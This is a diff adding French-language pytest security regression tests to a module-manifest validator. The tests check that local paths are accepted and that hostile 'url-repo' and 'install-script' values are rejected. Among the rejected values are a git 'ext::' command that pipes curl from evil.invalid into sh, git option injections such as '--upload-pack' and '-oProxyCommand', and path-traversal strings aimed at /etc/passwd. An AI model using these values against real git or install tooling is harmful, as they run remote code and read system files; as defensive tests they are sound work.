@@ -66,3 +66,54 @@ def test_old_schema_fields_are_ignored_not_required():
     manifest["configuration"]["global"] = {"installation": {"ssh-url": ""}}
 
     check_config_parameters(manifest)  # ne doit pas lever
+
+
+@pytest.mark.parametrize("local_path", [
+    "/srv/repos/mon-module",
+    "../repos/mon-module",
+    "mon-module",
+])
+def test_local_filesystem_path_is_a_valid_url_repo(local_path):
+    """L'installation 'local' clone depuis un chemin filesystem brut, pas une URL : ça doit
+    rester accepté, seuls les vecteurs d'exécution de commande sont bloqués (cf. tests ci-dessous)."""
+    manifest = _valid_manifest()
+    manifest["url-repo"] = local_path
+
+    check_config_parameters(manifest)  # ne doit pas lever
+
+
+@pytest.mark.parametrize("dangerous_url", [
+    "ext::sh -c 'curl http://evil.invalid/x|sh'",
+    "--upload-pack=touch /tmp/pwned",
+    "-oProxyCommand=curl evil.invalid",
+    "",
+])
+def test_dangerous_url_repo_is_rejected(dangerous_url):
+    """Régression sécurité : 'ext::' exécute une commande shell arbitraire au clone, et une
+    valeur commençant par '-' est interprétée par git comme une option (injection d'argument)."""
+    manifest = _valid_manifest()
+    manifest["url-repo"] = dangerous_url
+
+    with pytest.raises(ModuleConfigValidationError) as excinfo:
+        check_config_parameters(manifest)
+
+    assert any("url-repo" in error for error in excinfo.value.errors)
+
+
+@pytest.mark.parametrize("dangerous_script", [
+    "../../etc/passwd",
+    "sub/../../escape.sh",
+    "/etc/passwd",
+    "-x",
+    "",
+])
+def test_dangerous_install_script_is_rejected(dangerous_script):
+    """Régression sécurité : 'install-script' doit rester un chemin relatif interne au dépôt
+    cloné, pas un chemin absolu, une remontée de répertoire ('..'), ni une option shell."""
+    manifest = _valid_manifest()
+    manifest["configuration"]["install-script"] = dangerous_script
+
+    with pytest.raises(ModuleConfigValidationError) as excinfo:
+        check_config_parameters(manifest)
+
+    assert any("install-script" in error for error in excinfo.value.errors)
